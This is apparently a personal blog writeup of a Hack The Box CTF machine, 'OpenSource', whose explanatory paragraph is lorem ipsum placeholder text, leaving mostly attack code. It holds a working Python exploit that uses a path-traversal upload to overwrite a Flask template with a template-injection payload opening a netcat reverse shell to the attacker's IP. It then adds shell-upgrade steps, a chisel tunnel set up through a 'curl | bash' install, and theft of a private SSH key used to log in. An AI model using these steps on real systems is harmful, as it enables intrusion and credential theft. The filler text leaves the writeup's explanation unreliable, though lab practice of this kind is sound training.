+++
title = "First HTB CTF: OpenSource"
date = 2022-05-30

[taxonomies]
categories = ["htb"]
+++

This weekend I hacked my way through my first Hack The Box CTF. This was an exciting/frustrating and enlightening experience. This writeup will cronicle how I hacked the box, and some of the interestings things I learned on the way.

<!-- more -->
Ut luctus dolor ut tortor hendrerit, sed hendrerit augue scelerisque. Suspendisse quis sodales dui, at tempus ante. Nulla at tempor metus. Aliquam vitae rutrum diam. Curabitur iaculis massa dui, quis varius nulla finibus a. Praesent eu blandit justo. Suspendisse pharetra, arcu in rhoncus rutrum, magna magna viverra erat, eget vestibulum enim tellus id dui. Nunc vel dui et arcu posuere maximus. Mauris quam quam, bibendum sed libero nec, tempus hendrerit arcu. Suspendisse sed gravida orci. Fusce tempor arcu ac est pretium porttitor. Aenean consequat risus venenatis sem aliquam, at sollicitudin nulla semper. Aenean bibendum cursus hendrerit. Nulla congue urna nec finibus bibendum. Donec porta tincidunt ligula non ultricies.

```python
import requests

# set ip addresses 
target = '10.10.11.164'
attacker = '10.10.14.48'
# attacker = '10.0.2.15'

# build payload for reverse shell
command = f'nc {attacker} 4444 -e /bin/sh'

headers = {
    'Host': target,
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://10.10.11.164',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarySHIrKoubQdZqALfJ',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://10.10.11.164/upcloud',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}

# rewrite a template file by exploting the relative path
target_overwrite = '//app/app/templates/index.html'

# build template with injected python to access shell
# PS: use codepoint \u007b and \u007d
data = f'''------WebKitFormBoundarySHIrKoubQdZqALfJ
Content-Disposition: form-data; name="file"; filename="{target_overwrite}"
Content-Type: application/octet-stream


<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>@drbh</title>
<body>
<pre>
hello 

\u007b\u007b self.__init__.__globals__.__builtins__.__import__('os').system('{command}') \u007d\u007d
</pre>
</body>
</html>
------WebKitFormBoundarySHIrKoubQdZqALfJ--
'''
# send request
response = requests.post(f'http://{target}/upcloud', headers=headers, data=data, verify=False)
# print(response)
# print(response.text)

# load page to do remote execution
# PS: should be running reverse shell listener like: ncat -lvp 4444
try:
    requests.get(f'http://{target}/', timeout=1)
except:
    pass
```


python -c 'import pty; pty.spawn("/bin/ash")'

ctrl-z
stty raw -echo
stty raw -echo; fg


Pivot


```
## client
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz
ncat -lvp 8888 < chisel_1.7.7_linux_386.gz
nc 10.10.14.46 8888 > chisel.gz
gzip -d chisel.gz
chmod +x chisel
chisel client 10.10.14.46:7000 R:3000:10.10.11.164:3000


## server
curl https://i.jpillora.com/chisel! | bash
chisel server -p 7000 --reverse -v
```


```
git --no-pager log --decorate=short -3 --stat

git --no-pager diff a76f8f75f7a4a12b706b0cf9c983796fa1985820 -- app/.vscode/settings.json
```


curl http://localhost:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa > sshkey.pem


ssh -i sshkey.pem dev01@10.10.11.164